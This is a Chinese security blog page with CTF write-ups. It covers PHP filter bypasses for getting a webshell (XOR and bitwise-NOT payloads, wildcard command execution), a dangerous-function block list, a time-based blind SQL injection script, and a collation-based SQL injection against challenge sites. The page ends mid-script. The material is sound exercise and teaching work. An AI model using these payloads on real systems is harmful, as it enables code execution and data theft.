<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Iuhrey的幻想乡</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手">
<meta property="og:type" content="website">
<meta property="og:title" content="Iuhrey的幻想乡">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Iuhrey的幻想乡">
<meta property="og:description" content="一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Iuhrey的幻想乡">
<meta name="twitter:description" content="一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手">
  
    <link rel="alternate" href="/atom.xml" title="Iuhrey的幻想乡" type="application/atom+xml">
  
  
    <link rel="icon" href="source/images/favicon.ico" />
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="/plugin/bganimation/bg.css">
  

</head>

<body>
  <div id="container">
    <div id="wrap">
      <div class="outer">
        <div class="widget-wrap mobile-header">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <img class="avatar" src="/images/avatar.jpg">
    <h2 class="author">Iuhrey</h2>
    <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
    <div class="count-box">
      <a href="/archives"><div><strong>23</strong><br>文章</div></a>
      <a href="/categories"><div><strong>2</strong><br>分类</div></a>
      <a href="/tags"><div><strong>11</strong><br>标签</div></a>
    </div>
    <ul class="blog-link">
     
          <a href="/" title="Home">
            <li>幻想乡的起点</li>
          </a>
        
          <a href="/archives" title="Archives">
            <li>幻想乡图</li>
          </a>
        
          <a href="/categories" title="Categories">
            <li>分岔路</li>
          </a>
        
          <a href="/tags" title="Tags">
            <li>路标</li>
          </a>
        
    </ul>
  </div>
</div>

        <section id="main">
  
    <article id="post-绕过过滤getshell的一些骚操作" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/09/27/绕过过滤getshell的一些骚操作/" class="article-date">
  <time class="post-time" datetime="2018-09-27T07:58:05.000Z" itemprop="datePublished">
    <span class="post-month">9月</span><br/>
    <span class="post-day">27</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/09/27/绕过过滤getshell的一些骚操作/">绕过过滤getshell的一些骚操作</a>
    </h1>
  

        <div>
          
  <div class="article-category">
    <a class="article-category-link" href="/categories/日常学习/">日常学习</a>
  </div>

          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近忙着一些社团的杂事，学习进度一度停滞不前….不知怎么见着其他人的技术越来越高，心中有了一丝无奈以及失望，不知道还能坚持多久下去，咸鱼总是停于安逸之处，强者总能一直前进不止。<br>借着安恒的题目归纳一下绕过限制getshell的几种策略。</p>
<h2 id="getshell前置内容"><a href="#getshell前置内容" class="headerlink" title="getshell前置内容"></a>getshell前置内容</h2><p>在之前的文章讲过了getshell的一些基本内容，重复内容就不讲解了。一般我们通过一些函数来传入命令参数，再通过解析将命令执行最终输出我们想要的结果，具体说一下这些函数的特点:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert():检查一个断言是否为 FALSE，如果是 FALSE 则返回 FALSE，否则是 TRUE。但是这并不是它被利用的原因，在传入一个字符串后，这个字符串会被当做PHP代码来执行，比如我们常用的phpinfo()，file_put_content()等等都能执行。值得注意的是这里不仅仅可以传入字符串，也能传入函数。</span><br><span class="line">eval():把字符串按照 PHP 代码来计算，和上者类似，但是eval()只能传入字符串。</span><br><span class="line">system():执行外部程序，并且显示输出。执行命令把结果返回。  </span><br><span class="line">exec():执行命令，如果带有参数，会将结果返回。</span><br></pre></td></tr></table></figure></p>
<p>然后就是要认识一些基础的linux或者windows下的命令了，具体可以自行百度，后续用到的命令也会粗略提及。  </p>
<h2 id="函数被过滤"><a href="#函数被过滤" class="headerlink" title="函数被过滤"></a>函数被过滤</h2><p>一般来说，网站会通过过滤shell里常用的一些函数来防止被攻击，常见的过滤手段如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$iarok[] = str_ireplace(array(&apos;unlink&apos;,&apos;opendir&apos;,&apos;mysqli_&apos;,&apos;mysql_&apos;,&apos;socket_&apos;,&apos;curl_&apos;,&apos;base64_&apos;,&apos;putenv&apos;,&apos;popen(&apos;,&apos;phpinfo&apos;,&apos;pfsockopen&apos;,&apos;proc_&apos;,&apos;preg_&apos;,&apos;_GET&apos;,&apos;_POST&apos;,&apos;_COOKIE&apos;,&apos;_REQUEST&apos;,&apos;_SESSION&apos;,&apos;_SERVER&apos;,&apos;assert&apos;,&apos;eval(&apos;,&apos;file_&apos;,&apos;passthru(&apos;,&apos;exec(&apos;,&apos;system(&apos;,&apos;shell_&apos;), &apos;@.@&apos;, $v);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>通过将命令执行函数或者一些危险的存在利用点的函数全部用无效符号替换。这种过滤的绕过方式有大致几种，第一种就是通过字符串拼接来绕过，其余可以通过大小写绕过，或者双写绕过，这里的方式可以参考之前XSS过滤的方式。  </p>
<h3 id="参考示例"><a href="#参考示例" class="headerlink" title="参考示例"></a>参考示例</h3><p>最近接触到的应该是安恒杯9月web1，web1通过利用之前seacms爆出的漏洞而改的，具体示例可以参考seacms最新后台getshell的文章:<a href="https://www.anquanke.com/post/id/153402。" target="_blank" rel="noopener">https://www.anquanke.com/post/id/153402。</a><br>在过滤了_GET，_POST以及cookie传参的途径下，通过字符拼接成功构造了payload。参考如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$GLOBALS[&quot;_G&quot;.&quot;ET&quot;][$a]($GLOBALS[&quot;_G&quot;.&quot;ET&quot;][$b]);</span><br></pre></td></tr></table></figure></p>
<p>我们传入a=system&amp;b=ls，就形成了system(“ls”);，ls命令成功执行最后返回结果。  </p>
<h2 id="数字和字母被过滤"><a href="#数字和字母被过滤" class="headerlink" title="数字和字母被过滤"></a>数字和字母被过滤</h2><p>这个比上面那个过滤稍微狠一点，拼接字符串是不太可能实现了，具体过滤实现代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(!preg_match(&apos;/[a-z0-9]/is&apos;,$_GET[&apos;shell&apos;])) &#123;</span><br><span class="line">  eval($_GET[&apos;shell&apos;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><p>虽然过滤了数字和字符，但是这并不意味着就没办法构造出字符和数字了，异或以及反取符号都在的情况下，可以通过不可见字符转换为字母，比如以下的几个例子:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&apos;a&apos; = &apos;=&apos; ^ &apos;\\&apos;</span><br><span class="line">&apos;e&apos; = &apos;@&apos; ^ &apos;%&apos;</span><br><span class="line">&apos;r&apos; = &apos;.&apos; ^ &apos;\\&apos;</span><br><span class="line">&apos;t&apos; = &apos;(&apos; ^ &apos;\\&apos;</span><br><span class="line">&apos;s&apos; = &apos;/&apos; ^ &apos;\\&apos;</span><br><span class="line">&apos;m&apos; = &apos;-&apos; ^ &apos;@&apos;</span><br><span class="line">&apos;y&apos; = &apos;&amp;&apos; ^ &apos;_&apos;</span><br><span class="line">&apos;E&apos; = &apos;&gt;&apos; ^ &apos;&#123;&apos;</span><br><span class="line">&apos;G&apos; = &apos;&lt;&apos; ^ &apos;&#123;&apos;</span><br><span class="line">&apos;O&apos; = &apos;/&apos; ^ &apos;`&apos;</span><br><span class="line">&apos;P&apos; = &apos;+&apos; ^ &apos;&#123;&apos;</span><br><span class="line">&apos;S&apos; = &apos;(&apos; ^ &apos;&#123;&apos;</span><br><span class="line">&apos;T&apos; = &apos;/&apos; ^ &apos;&#123;&apos;</span><br></pre></td></tr></table></figure></p>
<p>这些是我测试出来可以构造payload的操作，可以直接拿来用。例如构造以下payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=$_=&quot;_&quot;.(&apos;&lt;&apos; ^ &apos;&#123;&apos;).(&apos;&gt;&apos; ^ &apos;&#123;&apos;).(&apos;/&apos; ^ &apos;&#123;&apos;);  //$_=&quot;_GET&quot;</span><br><span class="line">$&#123;$_&#125;[_]($&#123;$_&#125;[__]);  //$_GET[_]($_GET[__])</span><br><span class="line">&amp;_=(&apos;/&apos; ^ &apos;\\&apos;).(&apos;&amp;&apos; ^ &apos;_&apos;).(&apos;/&apos; ^ &apos;\\&apos;).(&apos;(&apos; ^ &apos;\\&apos;).(&apos;@&apos; ^ &apos;%&apos;).(&apos;-&apos; ^ &apos;@&apos;)  //system($_GET[__])</span><br></pre></td></tr></table></figure></p>
<p>接着传入命令就行了。<br><strong>值得注意的是，不仅仅可以用其他可见字符，不可见字符经过url编码进行异或也是可以实现的。</strong></p>
<h3 id="取反-参考了p神的文章"><a href="#取反-参考了p神的文章" class="headerlink" title="取反(参考了p神的文章)"></a>取反(参考了p神的文章)</h3><p>和上一种方法类似的是取反，例如\x9e取反之后就成了a，各个字符如何通过取反得到可以去测试一下，如下是构造的payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=$&#123;~&quot;\xA0\xB8\xBA\xAB&quot;&#125;[_]($&#123;~&quot;\xA0\xB8\xBA\xAB&quot;&#125;[__]); //$_GET[_]($_GET[__])</span><br><span class="line">&amp;_=&#123;~&quot;\x8c\x86\x8c\x8b\x9a\x92&#125;  //system</span><br><span class="line">&amp;__=&#123;~&quot;\x93\x8c&quot;&#125; //ls</span><br></pre></td></tr></table></figure></p>
<p>此外可以参考p神写的这个payload,他利用了utf8汉字编码提取出类似的编码进行取反:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$__=(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)+(&apos;&gt;&apos;&gt;&apos;&lt;&apos;);</span><br><span class="line">$_=$__/$__;</span><br><span class="line"></span><br><span class="line">$____=&apos;&apos;;</span><br><span class="line">$___=&quot;瞰&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;的&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;半&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;始&quot;;$____.=~($___&#123;$__&#125;);</span><br><span class="line"></span><br><span class="line">$_____=&apos;_&apos;;$___=&quot;俯&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;瞰&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;次&quot;;$_____.=~($___&#123;$_&#125;);$___=&quot;站&quot;;$_____.=~($___&#123;$_&#125;);</span><br><span class="line"></span><br><span class="line">$_=$$_____;</span><br><span class="line">$____($_[$__]);</span><br></pre></td></tr></table></figure></p>
<p><strong>还有一种也是p神想出来的方法，具体操作可以参考他的这篇文章<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></strong></p>
<h3 id="参考示例-1"><a href="#参考示例-1" class="headerlink" title="参考示例"></a>参考示例</h3><p>这是一道代码审计的题目:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;flag.php&apos;;</span><br><span class="line">if(isset($_GET[&apos;code&apos;]))&#123;</span><br><span class="line">    $code = $_GET[&apos;code&apos;];</span><br><span class="line">    if(strlen($code)&gt;40)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">//$hint = &quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>让我们不使用字母以及数字来执行getFlag()这个函数，这里就可以参考上面的payload来进行绕过了，payload如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$_=&quot;`&#123;&#123;&#123;&quot; ^ &quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]();&amp;_=getFlag</span><br></pre></td></tr></table></figure></p>
<p><strong>PS:`代表执行命令，?匹配字符，所以形成_GET字符</strong></p>
<h2 id="数字，字母，-以及-被过滤"><a href="#数字，字母，-以及-被过滤" class="headerlink" title="数字，字母，$以及_被过滤"></a>数字，字母，$以及_被过滤</h2><p>这个就比上一个再更加狠一点了，因为我们所要的$被过滤了，也就是说我们无法构造变量了，这里用到了一个很冷门的知识:<strong>?&gt;&lt;?=是可以直接输出后面的代码的</strong>(具体原理参考大师傅们的解释)，以及?是通配符这个知识。例如我们使用/???/???可以匹配/bin/cat这个命令。</p>
<h3 id="参考示例-2"><a href="#参考示例-2" class="headerlink" title="参考示例"></a>参考示例</h3><p>这是安恒杯web2的一部分题目:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;flag.php&apos;;</span><br><span class="line">if(isset($_GET[&apos;code&apos;]))&#123;</span><br><span class="line">    $code = $_GET[&apos;code&apos;];</span><br><span class="line">    if(strlen($code)&gt;35)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>再通过操作得出有/flag的前提下，我们可以使用上面的知识，生成以下payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=?&gt;&lt;?=`/???/??? /????`;?&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="字符长度限制"><a href="#字符长度限制" class="headerlink" title="字符长度限制"></a>字符长度限制</h2><p>这就要结合某次丧心病狂的比赛了，里面都是命令执行，这部分在后续会详细写出来……..</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/09/27/绕过过滤getshell的一些骚操作/" data-id="cjmnirs6a00007gve3elyvc90" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Getshell/">Getshell</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-solve-me-后续" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/08/16/solve-me-后续/" class="article-date">
  <time class="post-time" datetime="2018-08-16T04:21:27.000Z" itemprop="datePublished">
    <span class="post-month">8月</span><br/>
    <span class="post-day">16</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/08/16/solve-me-后续/">solve me 后续</a>
    </h1>
  

        <div>
          
  <div class="article-category">
    <a class="article-category-link" href="/categories/日常学习/">日常学习</a>
  </div>

          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="I-am-slowly"><a href="#I-am-slowly" class="headerlink" title="I am slowly"></a>I am slowly</h2><p><img src="../../images/17/24.png" alt=""><br>题目和之前的一题一样，是一道注入题。分析题目大致流程是这样：<br>当我们输入answer时，首先判断数据库是否有表，如果没有的话就会创建一个新的表，有的话会从表中进行语句的查询。如果count等于12，那么就会销毁表中的数据。接着判断语句查询回显是否为answer，如果不为，那么count数+1。<br>大致流程是这样，不过有个很明显的缺陷就是<strong>count === 12</strong>一般来说这里完全可以使用&gt;= 12来阻止盲注，这里却是使用===来进行阻止。这里就可以卡着11这个节点让count连续加上两次。<strong>我们在连续访问第十一次之后，创建一个sleep(50)的请求，再快速访问一次，快速访问过后count为12，但是之前sleep(50)已经过了count的比较，等sleep(50)回应过后，count就变成了13，接着就能无限次的时间盲注访问了。</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">header = &#123;&#125;#这里是你绕过12次后的header值</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(1,1000):</span><br><span class="line">    for j in &quot;abcdefghijklmnopqrstuvwxyz1234567890&#123;&#125;_&quot;:</span><br><span class="line">        url = &quot;http://iamslowly.thinkout.rf.gd/?answer=&apos; or case when(answer like &apos;%s%%&apos;) sleep(30) else sleep(0) end --+&quot;%(flag+j)</span><br><span class="line">        try:</span><br><span class="line">            r = requests.get(url=url,headers=header,timeout=29)</span><br><span class="line">            print &quot;i:&quot;,i,&quot;j:&quot;,j,r.content[:10]</span><br><span class="line">        except:</span><br><span class="line">            flag += j</span><br><span class="line">            print flag</span><br><span class="line">            break</span><br></pre></td></tr></table></figure></p>
<h2 id="Cheap-lottery"><a href="#Cheap-lottery" class="headerlink" title="Cheap lottery"></a>Cheap lottery</h2><p>这是一道很好的题目，相比之下我宁愿做一道难题也不愿做十道简单的题目，而且最近有些浮躁，一些基础原理回过头没能理会真正的意思。<br>打开题目是一个购买类似彩票的网站，然后题目要求我们通过购买五个数字，全部正确才能得到flag，按照常理来说，这种概率是很小很小的，所以肯定有其他的方式来获得flag。<br>一如既往的先去robots.txt看看，发现有个backup，里面有一个sql文件，给我们提示了lottery表的构造，然后就是源码了，废话不多说开始审计，主要梳理一下流程。<br><img src="../../images/17/28.png" alt=""><br>这里值得注意的是name的参数是通过guest_加上我们ip地址，这是为了识别我们购买彩票的用户，而且限定了一个IP只能购买一次彩票，有效的阻止了通过爆破来获取flag。然后判断我们是否选择了五个数字，未选满则会让我们选满五个才能进入下一步的操作。<br><img src="../../images/17/29.png" alt=""><br>在通过判断一分钟之内我们没买过彩票之后进入这个语句，服务器通过识别用户ip，创建一个名为admin_ip的用户数据，把自己随机生成的五个数一同插入数据库，接着从url中把字母，=，以及[]全部过滤为空，然后把&amp;所连接的几个参数转变为数组的形式。<br><img src="../../images/17/30.png" alt=""><br>通过判断间隔时间是否超过一分钟，如果未超时，那么开始从数据库中查找guest_ip以及admin_ip的数据，比对两者的数字是否一致，只有两者五个数字完全一致才能得到flag。<br>整体看了看流程，能出现的漏洞只有可能是注入以及逻辑漏洞，但是分析流程发现逻辑漏洞存在的可能并不高，数据对接找不到可以利用的点，所以只能是sql注入了，而且在backup中还提示了lottery表的基本构造，所以可以敲定是sql注入，可是注入点在哪里呢？在传参的过程中只有一个是用户可控输入的，那就是lottery，也只能从这里下手，但是服务器在处理参数的时候把字母处理掉了，也就是说在构造guest_ip是不太可能实现的，这该怎么办呢？  </p>
<p>利用数据库的字符集转换！！！！！！！！<br>参考了大师傅的分析文章，发现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection；</span><br><span class="line">2. 进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：</span><br><span class="line">使用每个数据字段的CHARACTER SET设定值；</span><br><span class="line">• 若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准)；</span><br><span class="line">• 若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值；</span><br><span class="line">• 若上述值不存在，则使用character_set_server设定值。</span><br><span class="line">3. 将操作结果从内部操作字符集转换为character_set_results。</span><br></pre></td></tr></table></figure></p>
<p>这题目的转换就是从utf8-&gt;utf8-&gt;utf8，但是发现好像并没有什么作用，在utf8中我们找不到能替代字母的字符，那也只能继续找能代替字母的字符，参考了离别歌师傅的文章，找到了关键的突破口：<strong>utf8和默认collation字符顺序下不同编码字符被认为相等的特性</strong>，也就是说我们可以使用à来替代a。在mysql的官方文档中说明了这一点：<br><img src="../../images/17/31.png" alt=""><br>接着梳理character set与collation的关系：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql 有两个支持 unicode 的 character set:  </span><br><span class="line">ucs2: 使用 16 bits 来表示一个 unicode 字符。  </span><br><span class="line">utf8: 使用 1~3 bytes 来表示一个 unicode 字符。</span><br></pre></td></tr></table></figure></p>
<p>接着本地测试:<br><img src="../../images/17/32.png" alt=""><br>发现collation默认的是utf8_general_ci，在此规则下大小写是不敏感的，所以也可以解释为什么<strong>admin=AdMin</strong>，继续深入。<br>unicode比对字符串默认顺序如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.alphabetic ordering</span><br><span class="line">2.diacritic ordering</span><br><span class="line">3.case ordering.</span><br></pre></td></tr></table></figure></p>
<p>在2的变音排序时，导致了上述的*A 和 Â 是一个字母。所以到此为止，结合以上的几个原理，有大师傅通过这些原理测试出了一张比对表，参考如下：<br><a href="http://collation-charts.org/mysql60/mysql604.utf8_general_ci.european.html" target="_blank" rel="noopener">http://collation-charts.org/mysql60/mysql604.utf8_general_ci.european.html</a><br>根据比对的结果可以得出：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin:%C3%A1%C4%8F%E1%B8%BF%C3%AD%C5%84</span><br><span class="line">guest:%C4%9F%C3%BA%C3%A9%C5%9B%C5%A5</span><br></pre></td></tr></table></figure></p>
<p>构造payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ip = &quot;149.28.21.208&quot;;</span><br><span class="line">$time = time();</span><br><span class="line">$url = &quot;http://cheaplottery.solveme.peng.kr/index.php?lottery[A]=1&apos;),(&apos;%C3%A1%C4%8F%E1%B8%BF%C3%AD%C5%84_$ip&apos;,&apos;$time&apos;,&apos;1,2,3,4,5&apos;),(&apos;%C4%9F%C3%BA%C3%A9%C5%9B%C5%A5_$ip&apos;,&apos;$time&apos;,&apos;1,2,3,4,5&apos;)%23&amp;lottery[B]=&amp;lottery[C]=&amp;lottery[D]=&amp;lottery[E]=&quot;;</span><br><span class="line">echo $url;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>接着在服务器curl一下 <a href="http://cheaplottery.solveme.peng.kr/index.php" target="_blank" rel="noopener">http://cheaplottery.solveme.peng.kr/index.php</a> 就行了。</p>
<h2 id="Check-via-eval"><a href="#Check-via-eval" class="headerlink" title="Check via eval"></a>Check via eval</h2><p><img src="../../images/17/25.png" alt=""><br>审题，题目要求我们输入flag参数的值，不传参的话就会如图所示有一个神秘连接，其实就是返回当前时间戳的sha1值，由于第一个条件需要这个长度，那先点击进去测试长度发现为49，所以我们需要构造一个长度为49的payload。接着用正则过滤了\，()，[]，’，.，flag等等要求我们输入的flag通过eval函数输出等于sha1(flag)的值。<br>这题目考的是一个关于eval函数的知识:<br><img src="../../images/17/26.png" alt=""><br><img src="../../images/17/27.png" alt=""><br>具体原理可以去看eval函数的源码，这里思路就很明确了，构造?&gt;&lt;?=$flag;就行了但是flag被过滤了，这里既然有了eval，那么我们完全可以使用多个语句来构造：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=$&#123;$a&#125;;?&gt;;  </span><br><span class="line">$a=&apos;alag&apos;;</span><br><span class="line">$a&#123;0&#125;=&apos;f&apos;</span><br></pre></td></tr></table></figure></p>
<p>接着用无关的东西填充就行了。最终payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://checkviaeval.solveme.peng.kr/?flag=$a=&apos;alag&apos;;$a&#123;0&#125;=&apos;f&apos;;?&gt;&lt;?=$&#123;$a&#125;?&gt;;1111111111111111</span><br></pre></td></tr></table></figure></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/08/16/solve-me-后续/" data-id="cjmni3xt8000iywvej23l0vuv" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-关于代码审计的一些绕过方式" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/08/02/关于代码审计的一些绕过方式/" class="article-date">
  <time class="post-time" datetime="2018-08-02T10:29:37.000Z" itemprop="datePublished">
    <span class="post-month">8月</span><br/>
    <span class="post-day">02</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/08/02/关于代码审计的一些绕过方式/">关于代码审计的一些绕过方式</a>
    </h1>
  

        <div>
          
  <div class="article-category">
    <a class="article-category-link" href="/categories/日常学习/">日常学习</a>
  </div>

          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这段时间断断续续的在做一些题目，知识点太过杂乱，而且时间太过仓促所以没写多少博客，最近刚好在系统学习一些php代码审计的内容，因此记录一些常见的绕过方式(参考一夜飘零师傅的博客)<br>题目的地址如下:<a href="http://solveme.peng.kr/" target="_blank" rel="noopener">http://solveme.peng.kr/</a>    </p>
<h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p><img src="../images/17/1.png" alt=""><br>按照他如何加密我们如何解密就行了。  </p>
<h2 id="Bad-compare"><a href="#Bad-compare" class="headerlink" title="Bad compare"></a>Bad compare</h2><p><img src="../images/17/2.png" alt=""><br>题目要求我们传入一个名为answer的变量，变量要等于后面一串奇怪的字符串。<br>直接复制是不太可能的，这里的字符应该是不可见字符，所以我们可以直接用脚本抓取网页代码然后在对应的区域进行url编码，最后把url编码传过去。附上脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">url = &apos;http://badcompare.solveme.peng.kr/&apos;</span><br><span class="line">r = requests.get(url)</span><br><span class="line">ans = 